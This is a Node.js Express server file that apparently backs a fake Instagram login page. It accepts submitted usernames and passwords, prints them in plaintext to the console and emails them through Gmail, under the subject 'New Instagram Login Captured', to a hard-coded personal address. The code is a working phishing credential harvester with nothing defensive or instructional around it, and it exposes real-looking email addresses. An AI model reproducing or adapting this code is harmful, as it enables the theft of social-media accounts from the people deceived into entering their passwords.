// server.js
const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer'); // <-- Added this line
const app = express();
const PORT = 3000;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve the HTML file
app.use(express.static(__dirname));

// Setup Nodemailer transporter
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,        // <-- Replace with your Gmail
        pass: process.env.EMAIL_PASS       // <-- Replace with Gmail App Password
    }
});

// Handle login POST request
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // Print to terminal
    console.log(`Received login - Username: ${username}, Password: ${password}`);

    // Email message setup
    const mailOptions = {
        from: 'rishikumarfgh11@gmail.com',              // Your email
        to: 'avijitkushwaha9474@gmail.com',                // Send to yourself
        subject: 'New Instagram Login Captured',
        text: `Username: ${username}\nPassword: ${password}`
    };

    // Send email
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
        } else {
            console.log('Email sent:', info.response);
        }
    });

    res.send('Login credentials received! Check your server terminal and email.');
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
